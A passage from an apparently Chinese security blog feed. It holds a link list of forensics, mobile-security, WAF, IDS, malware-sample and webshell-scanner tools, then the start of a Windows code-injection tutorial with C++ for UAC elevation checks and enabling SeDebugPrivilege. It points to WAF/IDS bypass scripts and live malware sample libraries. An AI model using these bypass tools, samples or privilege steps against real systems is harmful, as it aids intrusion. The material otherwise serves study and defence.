class="line">http:&#x2F;&#x2F;www.sweetscape.com&#x2F;010editor&#x2F; 识别不同文件格式（模板）的 16 进制编辑器，具有文件修复功能</span><br><span class="line">http:&#x2F;&#x2F;www.magicexif.com&#x2F; 将照片图像中的 exif 信息数据化</span><br><span class="line">http:&#x2F;&#x2F;mediaarea.net&#x2F;MediaInfo 类似 exiftool 来查看内容区域和元数据信息</span><br><span class="line">https:&#x2F;&#x2F;www.sno.phy.queensu.ca&#x2F;~phil&#x2F;exiftool&#x2F; 检查图像文件的 exif 元数据</span><br><span class="line">https:&#x2F;&#x2F;www.gimp.org&#x2F; Gimp 提供了转换各类图像文件可视化数据的功能，还可以用于确认文件是否是一个图像文件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;volatilityfoundation&#x2F;volatility windows 内存取证分析</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;gleeda&#x2F;memtriage Windows 内存取证分析</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SekoiaLab&#x2F;Fastir_Collector Windows 取证&#x2F;信息收集，不限于内存，注册表，文件信息等</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Viralmaniar&#x2F;Remote-Desktop-Caching- RDP 信息复原，png 图片格式</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;comaeio&#x2F;LiveCloudKd C，针对 Hyper-V 的内存取证</span><br><span class="line">-https:&#x2F;&#x2F;github.com&#x2F;sevagas&#x2F;swap_digger 针对 Linux swap 进行取证分析的工具</span><br><span class="line">http:&#x2F;&#x2F;extundelete.sourceforge.net&#x2F; linux 下的文件恢复</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;viaforensics&#x2F;android-forensics 安卓取证 App 和框架，可以对安卓设备内各种信息进行提取</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;davidmcgrew&#x2F;joy 用来捕获和分析内外网流量数据的包，主要用于进行网络调查、安全监控和取证</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;USArmyResearchLab&#x2F;Dshell 可扩展的网络取证分析框架，支持快速开发插件与解析网络数据包捕获</span><br><span class="line">http:&#x2F;&#x2F;qpdf.sourceforge.net&#x2F; 查看 pdf 文件并整理提取信息</span><br><span class="line">http:&#x2F;&#x2F;zipinfo.com&#x2F; 在无需提取的情况下列出了 zip 文件的内容信息</span><br><span class="line">http:&#x2F;&#x2F;f00l.de&#x2F;pcapfix&#x2F; pcap 文件修复</span><br><span class="line">https:&#x2F;&#x2F;www.cgsecurity.org&#x2F;wiki&#x2F;TestDisk 磁盘分区修复</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;decalage2&#x2F;oletools py，用于分析 MS OLE2 文件（结构化存储，复合文件二进制格式）和 MS Office 文档</span><br><span class="line">https:&#x2F;&#x2F;www.xplico.org&#x2F;download 内存取证</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;bochspwn-reloaded Bochspwn Reloaded（内核信息泄漏检测）工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;abrignoni&#x2F;DFIR-SQL-Query-Repo 收集用于数据取证的 SQL 查询模板</span><br><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;news&#x2F;193684.html iOS 取证技巧：在无损的情况下完整导出 SQLite 数据库</span><br></pre></td></tr></table></figure><h3 id="移动安全"><a href="#移动安全" class="headerlink" title="移动安全"></a>移动安全</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Brucetg&#x2F;App_Security App 安全学习资源</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rovo89&#x2F;Xposed 随心所欲修改安卓手机系统</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;android-hacker&#x2F;VirtualXposed 基于 VirtualApp 和 epic 在非 ROOT 环境下运行 Xposed 模块的实现</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;MobSF&#x2F;Mobile-Security-Framework-MobSF 移动安全审计框架。android、ios、win</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;WooyunDota&#x2F;DroidSSLUnpinning 安卓证书锁定解除的工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;nccgroup&#x2F;house 运行时手机 App 分析工具包, 带 Web GUI</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;UltimateHackers&#x2F;Diggy 从 Apk 文件中提取 URLs 的工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;nettitude&#x2F;scrounger iOS 和 Android 移动应用程序渗透测试框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;XekriCorp&#x2F;LeakVM 安卓应用安全测试框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zsdlove&#x2F;ApkVulCheck 安卓漏洞扫描工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;samyk&#x2F;frisky 针对 ios&#x2F;macOS 应用的嗅探&#x2F;修改&#x2F;逆向&#x2F;注入等工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;GeoSn0w&#x2F;OsirisJailbreak12 IOS12 不完全越狱</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;chaitin&#x2F;passionfruit iOS 应用逆向与分析工具，可以大大加速 iOS 应用安全分析过程</span><br></pre></td></tr></table></figure><h3 id="防火墙规则、Waf、CDN-相关"><a href="#防火墙规则、Waf、CDN-相关" class="headerlink" title="防火墙规则、Waf、CDN 相关"></a>防火墙规则、Waf、CDN 相关</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;baidu&#x2F;openrasp RASP,Runtime Application Self-Protection，实时应用自我保护，更智能，针对每个语言定制</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;snort3&#x2F;snort3 snort 算是最出名的开源 ids 入侵检测</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;chaitin&#x2F;yanshi 长亭偃师（yanshi）,雷池（SafeLine）防火墙核心引擎使用到的代码生成工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;ModSecurity C，跨平台 WAF engine for Apache, IIS and Nginx</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;klaubert&#x2F;waf-fle ModSecurity Web 控制台</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;xsec-lab&#x2F;x-waf 适用于中小企业的云 waf</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jx-sec&#x2F;jxwaf 基于 openrestynginx+lua 开发，独创的业务逻辑防护引擎和机器学习引擎，解决传统 WAF 无法对业务安全进行防护的痛点</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;loveshell&#x2F;ngx_lua_waf 基于 lua-nginx-moduleopenresty 的 web 应用防火墙</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Janusec&#x2F;janusec 基于 Golang 开发的应用安全网关，具备 WAF、CC 攻击防御、证书私钥加密、负载均衡、统一 Web 化管理等功能。</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;owasp-modsecurity-crs a set of generic attack detection rules for use with ModSecurity or compatible web application firewalls</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;kirillwow&#x2F;ids_bypass IDS Bypass 脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;milo2012&#x2F;ipv4bypass 利用 ipV6 地址绕过 waf</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;3xp10it&#x2F;bypass_waf 防火墙绕过脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;m0rtem&#x2F;CloudFail 针对 Cloudfail,查找位于 CDN 后面网站的真实 IP</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Nitr4x&#x2F;whichCDN CDN 识别、检测</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;3xp10it&#x2F;xcdn 尝试找出 cdn 背后的真实 ip，3xp10it.github.io 博客</span><br></pre></td></tr></table></figure><h3 id="入侵检测"><a href="#入侵检测" class="headerlink" title="入侵检测"></a>入侵检测</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Neo23x0&#x2F;Loki 一款 APT 入侵痕迹扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ossec&#x2F;ossec-hids 开源 hids 堡垒机</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;grayddq&#x2F;HIDS hids 基于主机型入侵检测系统，一个人的安全部</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ysrc&#x2F;yulong-hids 驭龙 HIDS 是一款由 YSRC 开源的入侵检测系统</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;DianrongSecurity&#x2F;AgentSmith-HIDS 点融开源 HIDS，开源部分为主机情报收集工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Tencent&#x2F;HaboMalHunter 哈勃分析系统，linux 系统病毒分析及安全测试</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;JPCERTCC&#x2F;LogonTracer 根据 win 登陆记录日志来分析并用图形化展示恶意登陆行为</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;anwi-wips&#x2F;anwi 无线 IDS, 基于低成本的 Wi-Fi 模块(ESP8266)</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Security-Onion-Solutions&#x2F;security-onion 基于 ubuntu 用于入侵检测，网络安全监控和日志管理，采用分布式架构</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jpcertcc&#x2F;sysmonsearch 将 Sysmon 的日志结果可视化</span><br><span class="line">http:&#x2F;&#x2F;m.imooc.com&#x2F;article&#x2F;21236 快速自检电脑是否被黑客入侵过(Windows 版)</span><br><span class="line">http:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;system&#x2F;157597.html 快速自检电脑是否被黑客入侵过（Linux 版）</span><br><span class="line">http:&#x2F;&#x2F;www.freebuf.com&#x2F;rookie&#x2F;179638.html 服务器入侵溯源小技巧整理</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zhanghaoyil&#x2F;Hawk-I 基于无监督机器学习算法从 Web 日志中自动提取攻击 Payload</span><br></pre></td></tr></table></figure><h3 id="恶意文件测与样本分析"><a href="#恶意文件测与样本分析" class="headerlink" title="恶意文件测与样本分析"></a>恶意文件测与样本分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;open-power-workgroup&#x2F;Hospital 全国莆田系医院名单</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;chenerlich&#x2F;FCL 恶意代码使用的命令行收集</span><br><span class="line">https:&#x2F;&#x2F;paper.seebug.org&#x2F;421 常见软件合集与恶意软件分析</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sapphirex00&#x2F;Threat-Hunting apt 恶意软件样本</span><br><span class="line">https:&#x2F;&#x2F;www.malware-traffic-analysis.net&#x2F; 恶意软件样本</span><br><span class="line">http:&#x2F;&#x2F;dasmalwerk.eu&#x2F; 恶意软件样本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ytisf&#x2F;theZoo 恶意软件样本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mstfknn&#x2F;malware-sample-library 恶意软件样本</span><br><span class="line">http:&#x2F;&#x2F;99.248.235.4&#x2F;Library&#x2F; 恶意软件样本库。ladder</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;robbyFux&#x2F;Ragpicker 恶意软件信息爬取汇总分析</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;phage-nz&#x2F;ph0neutria 恶意软件信息爬取汇总分析</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;JR0driguezB&#x2F;malware_configs 常见恶意配置文件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sfaci&#x2F;masc 扫描网站中的恶意软件, 以及其他一些网站维护功能</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Neo23x0&#x2F;munin 依据文件 Hash 从各种在线恶意软件扫描服务提取信息的工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;1lastBr3ath&#x2F;drmine 自动化检测网页是否包含挖矿脚本的工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;KasperskyLab&#x2F;klara 卡巴斯基开源基于 Yara 的分布式恶意软件扫描系统,</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;botherder&#x2F;kraken go，实现的 Yara 恶意软件扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;alexandreborges&#x2F;malwoverview simple，将恶意文件进行快速分类</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;joxeankoret&#x2F;pigaios 直接对比源代码与编译的二进制文件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;viper-framework py2，二进制分析和管理框架，对恶意文件进行分析</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;netxfly&#x2F;sec_check 通过信息采集（账户、连接、端口等）与 yara 扫描进行安全检测</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;nao-sec&#x2F;tknk_scanner yara 引擎为基础的恶意软件识别框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;felixweyne&#x2F;ProcessSpawnControl powershell,对恶意程序进行检测与监控</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Aurore54F&#x2F;JaSt 使用语法检测恶意&#x2F;混淆的 JS 文件，https:&#x2F;&#x2F;www.blackhoodie.re&#x2F;assets&#x2F;archive&#x2F;JaSt_blackhoodie.pdf</span><br><span class="line">http:&#x2F;&#x2F;edr.sangfor.com.cn&#x2F; win，Linux 下恶意软件、webshell 检测查杀工具</span><br><span class="line">http:&#x2F;&#x2F;www.clamav.net&#x2F;downloads 病毒查杀软件</span><br><span class="line">http:&#x2F;&#x2F;www.chkrootkit.org&#x2F; rootkit 检测工具</span><br><span class="line">http:&#x2F;&#x2F;rootkit.nl&#x2F;projects&#x2F;rootkit_hunter.html rootkit 检测工具</span><br></pre></td></tr></table></figure><h3 id="恶意文件检测之-Webshell-查杀扫描"><a href="#恶意文件检测之-Webshell-查杀扫描" class="headerlink" title="恶意文件检测之 Webshell 查杀扫描"></a>恶意文件检测之 Webshell 查杀扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.safedog.cn&#x2F; 安全狗 web 防火墙</span><br><span class="line">http:&#x2F;&#x2F;d99net.net&#x2F; win，啊 D 出品 D 盾 _ 防火墙，包含 waf 与 webshel 检测功能</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;he1m4n6a&#x2F;findWebshell py，webshell 检查工具，可后期添加后门指纹，很强大</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ym2011&#x2F;ScanBackdoor 一款简洁的 Webshell 扫描工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;erevus-cn&#x2F;scan_webshell webshell 扫描工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;yassineaddi&#x2F;BackdoorMan 可对指定目录进行 php webshell 检测</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;nbs-system&#x2F;php-malware-finder 一款高效率 PHP-webshell 扫描工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;emposha&#x2F;PHP-Shell-Detector 测试效率高达 99%的 webshell 检测工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;emposha&#x2F;Shell-Detector Webshell 扫描工具，支持 php&#x2F;perl&#x2F;asp&#x2F;aspx webshell 扫描</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 资源 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows————代码注入与拦截</title>
      <link href="2020/12/05/CodeInjection/"/>
      <url>2020/12/05/CodeInjection/</url>
      
        <content type="html"><![CDATA[<h1 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h1><h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><img src="CodeInjection/UAC.png"  title="Mr_Hu-Image." alt="Mr_Hu-Image"/><h2 id="UAC机制"><a href="#UAC机制" class="headerlink" title="UAC机制"></a>UAC机制</h2><h3 id="管理方式"><a href="#管理方式" class="headerlink" title="管理方式"></a>管理方式</h3><p>在管理员账户下，运行一个程序，也是低权限，只有选择管理员方式运行，才会分配高权限。</p><img src="CodeInjection/UAC1.png"  title="Mr_Hu-Image." alt="Mr_Hu-Image"/><h3 id="调整UAC"><a href="#调整UAC" class="headerlink" title="调整UAC"></a>调整UAC</h3><p>方法1：gpedit</p><img src="CodeInjection/Gpedit-UAC.png"  title="Mr_Hu-Image." alt="Mr_Hu-Image"/><p>方法2 ：设置</p><img src="CodeInjection/Set-UAC.png"  title="Mr_Hu-Image." alt="Mr_Hu-Image"/><h3 id="使用案例"><a href="#使用案例" class="headerlink" title="使用案例"></a>使用案例</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CMy01UACDlg::OnInitDialog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CDialogEx::OnInitDialog();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 给按钮加小盾牌</span></span><br><span class="line"><span class="comment">// 3. 判断具体的权限状况</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 获得本进程的令牌</span></span><br><span class="line">HANDLE hToken = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &amp;hToken))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="comment">// 2. 获取提升类型</span></span><br><span class="line">TOKEN_ELEVATION_TYPE ElevationType = TokenElevationTypeDefault;</span><br><span class="line">BOOL                 bIsAdmin = <span class="literal">false</span>;</span><br><span class="line">DWORD                dwSize = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (GetTokenInformation(hToken, TokenElevationType, &amp;ElevationType,</span><br><span class="line"><span class="keyword">sizeof</span>(TOKEN_ELEVATION_TYPE), &amp;dwSize)) &#123;</span><br><span class="line"><span class="comment">// 2.1 创建管理员组的对应SID</span></span><br><span class="line">BYTE adminSID[SECURITY_MAX_SID_SIZE];</span><br><span class="line">dwSize = <span class="keyword">sizeof</span>(adminSID);</span><br><span class="line">CreateWellKnownSid(WinBuiltinAdministratorsSid, <span class="literal">NULL</span>, &amp;adminSID, &amp;dwSize);</span><br><span class="line"><span class="comment">// 2.2 判断当前进程运行用户角色是否为管理员</span></span><br><span class="line"><span class="keyword">if</span> (ElevationType == TokenElevationTypeLimited) &#123;</span><br><span class="line"><span class="comment">// a. 获取连接令牌的句柄</span></span><br><span class="line">HANDLE hUnfilteredToken = <span class="literal">NULL</span>;</span><br><span class="line">GetTokenInformation(hToken, TokenLinkedToken, (PVOID)&amp;hUnfilteredToken,</span><br><span class="line"><span class="keyword">sizeof</span>(HANDLE), &amp;dwSize);</span><br><span class="line"><span class="comment">// b. 检查这个原始的令牌是否包含管理员的SID</span></span><br><span class="line"><span class="keyword">if</span> (!CheckTokenMembership(hUnfilteredToken, &amp;adminSID, &amp;bIsAdmin))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">CloseHandle(hUnfilteredToken);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">bIsAdmin = IsUserAnAdmin();</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(hToken);</span><br><span class="line">&#125;</span><br><span class="line">BOOL bFullToken = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">switch</span> (ElevationType) &#123;</span><br><span class="line"><span class="keyword">case</span> TokenElevationTypeDefault: <span class="comment">/* 默认的用户或UAC被禁用 */</span></span><br><span class="line"><span class="keyword">if</span> (IsUserAnAdmin())  bFullToken = <span class="literal">true</span>; <span class="comment">// 默认用户有管理员权限</span></span><br><span class="line"><span class="keyword">else</span>                  bFullToken = <span class="literal">false</span>;<span class="comment">// 默认用户不是管理员组</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> TokenElevationTypeFull:    <span class="comment">/* 已经成功提高进程权限 */</span></span><br><span class="line"><span class="keyword">if</span> (IsUserAnAdmin())  bFullToken = <span class="literal">true</span>; <span class="comment">//当前以管理员权限运行</span></span><br><span class="line"><span class="keyword">else</span>                  bFullToken = <span class="literal">false</span>;<span class="comment">//当前未以管理员权限运行</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> TokenElevationTypeLimited: <span class="comment">/* 进程在以有限的权限运行 */</span></span><br><span class="line"><span class="keyword">if</span> (bIsAdmin)  bFullToken = <span class="literal">false</span>;<span class="comment">//用户有管理员权限，但进程权限有限</span></span><br><span class="line"><span class="keyword">else</span>           bFullToken = <span class="literal">false</span>;<span class="comment">//用户不是管理员组，且进程权限有限</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 4. 根据权限的不同控制按钮的显示</span></span><br><span class="line"><span class="keyword">if</span> (!bFullToken)</span><br><span class="line">Button_SetElevationRequiredState(::GetDlgItem(m_hWnd, IDC_BUTTON1),!bFullToken);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">::ShowWindow(::GetDlgItem(m_hWnd, IDC_BUTTON1), SW_HIDE);</span><br><span class="line"><span class="keyword">return</span> TRUE;  <span class="comment">// 除非将焦点设置到控件，否则返回 TRUE</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMy01UACDlg::OnBnClickedButton1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="comment">//以UAC的方式，重新启动程序</span></span><br><span class="line"><span class="comment">// 1. 获得本进程的令牌</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 隐藏当前窗口</span></span><br><span class="line">ShowWindow(SW_HIDE);</span><br><span class="line"><span class="comment">// 2. 获取当前程序路径</span></span><br><span class="line">WCHAR szApplication[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD cchLength = _countof(szApplication);</span><br><span class="line">QueryFullProcessImageName(GetCurrentProcess(), <span class="number">0</span>,</span><br><span class="line">szApplication, &amp;cchLength);</span><br><span class="line"><span class="comment">// 3. 以管理员权限重新打开进程</span></span><br><span class="line">SHELLEXECUTEINFO sei = &#123; <span class="keyword">sizeof</span>(SHELLEXECUTEINFO) &#125;;</span><br><span class="line">sei.lpVerb = <span class="string">L&quot;runas&quot;</span>;      <span class="comment">// 请求提升权限</span></span><br><span class="line">sei.lpFile = szApplication; <span class="comment">// 可执行文件路径</span></span><br><span class="line">sei.lpParameters = <span class="literal">NULL</span>;          <span class="comment">// 不需要参数</span></span><br><span class="line">sei.nShow = SW_SHOWNORMAL; <span class="comment">// 正常显示窗口</span></span><br><span class="line"><span class="keyword">if</span> (ShellExecuteEx(&amp;sei))</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ShowWindow( SW_SHOWNORMAL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMy01UACDlg::OnBnClickedButton2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">EnableDebugPrivilege(TRUE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CMy01UACDlg::EnableDebugPrivilege</span><span class="params">(BOOL fEnable)</span> </span>&#123;   <span class="comment">//提升为调试权限</span></span><br><span class="line">BOOL fOk = FALSE;    HANDLE hToken;</span><br><span class="line"><span class="comment">// 以修改权限的方式，打开进程的令牌</span></span><br><span class="line"><span class="keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,</span><br><span class="line">&amp;hToken)) &#123;</span><br><span class="line"><span class="comment">// 令牌权限结构体</span></span><br><span class="line">TOKEN_PRIVILEGES tp;</span><br><span class="line">tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//获得LUID</span></span><br><span class="line">LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line">tp.Privileges[<span class="number">0</span>].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : <span class="number">0</span>;</span><br><span class="line">AdjustTokenPrivileges(hToken, FALSE, &amp;tp, <span class="keyword">sizeof</span>(tp), <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">//修改权限</span></span><br><span class="line">fOk = (GetLastError() == ERROR_SUCCESS);</span><br><span 